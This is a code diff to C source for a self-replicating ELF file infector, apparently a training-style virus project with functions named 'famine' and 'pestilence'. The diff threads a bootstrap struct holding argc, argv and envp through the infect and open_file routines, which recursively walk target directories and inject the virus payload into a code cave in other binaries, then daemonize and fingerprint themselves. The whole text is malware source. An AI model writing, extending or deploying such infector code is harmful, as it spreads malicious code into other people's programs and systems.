@@ -19,15 +19,10 @@
 
 #define __asm__ __asm__ volatile
 
-typedef struct bootstrap_data_s {
-	int argc;
-	char **argv;
-	char **envp;
-} bootstrap_data_t;
 
 extern void end();
 
-void	famine(void);
+void	famine(bootstrap_data_t *bootstrap_data);
 void	jmp_end(void);
 void	entrypoint(int argc, char **argv, char **envp);
 void	_start(void);
@@ -154,7 +149,7 @@ static int	inject(t_data *data) {
 	return 0;
 }
 
-static int	infect(const char *filename, const char *self_name)
+static int	infect(const char *filename, bootstrap_data_t *bs_data)
 {
 
 	t_data data;
@@ -164,7 +159,7 @@ static int	infect(const char *filename, const char *self_name)
 	ft_strncpy(data.target_name, filename, sizeof(data.target_name));
 
 	/* get our own name */
-	ft_strncpy(data.self_name, self_name, sizeof(data.self_name));
+	data.bs_data = bs_data;
 
 	/* calculate the size of the payload before the mapping */
 	data.cave.p_size = (uintptr_t)&end - (uintptr_t)&_start;
@@ -248,7 +243,7 @@ static void	make_path(char *path, const char *dir, const char *file)
 	ft_stpncpy(ptr, file, PATH_MAX - (ptr - path));
 }
 
-static void open_file(const char *file, const char *self_path, uint16_t *counter)
+static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 {
 
 	int fd = open(file, O_RDONLY);
@@ -277,7 +272,7 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 				make_path(new_path, file, dir->d_name);
 
-				if (infect(new_path, self_path) == 0) {
+				if (infect(new_path, bs_data) == 0) {
 					(*counter)++;
 
 #ifdef ENABLE_EXEC
@@ -290,7 +285,7 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 				make_path(new_path, file, dir->d_name);
 
-				open_file(new_path, self_path, counter);
+				open_file(new_path, bs_data, counter);
 			}
 		}
 	}
@@ -299,7 +294,7 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 }
 
-void	famine(void)
+void	famine(bootstrap_data_t *bs_data)
 {
 #ifndef DEV_MODE
 	if (pestilence() != 0) {
@@ -308,7 +303,7 @@ void	famine(void)
 #endif
 
 	uint16_t counter = 0;
-	char host_name[PATH_MAX];
+	//char host_name[PATH_MAX];
 
 	const char *paths[] = {
 		STR("/tmp/test"),
@@ -317,15 +312,15 @@ void	famine(void)
 		NULL
 	};
 
-	if (self_name(host_name) != 0) {
-		return ;
-	}
+	//if (self_name(host_name) != 0) {
+	//	return ;
+	//}
 
 	for (int i = 0; paths[i]; ++i)
-		open_file(paths[i], host_name, &counter);
+		open_file(paths[i], bs_data, &counter);
 
 	if (counter != 0) {
-		self_fingerprint(host_name, counter);
+		self_fingerprint(bs_data->argv[0], counter);
 	}
 }
 
@@ -335,12 +330,11 @@ void	entrypoint(int argc, char **argv, char **envp)
 	bootstrap_data.argc = argc;
 	bootstrap_data.argv = argv;
 	bootstrap_data.envp = envp;
-	(void)bootstrap_data;
 
 	//write(1, bootstrap_data.argv[0], ft_strlen(bootstrap_data.argv[0]));
 	//write(1, STR("\n"), 1);
 	//
 	//print_env(bootstrap_data.envp);
 	daemonize(envp);
-	famine();
+	famine(&bootstrap_data);
 }
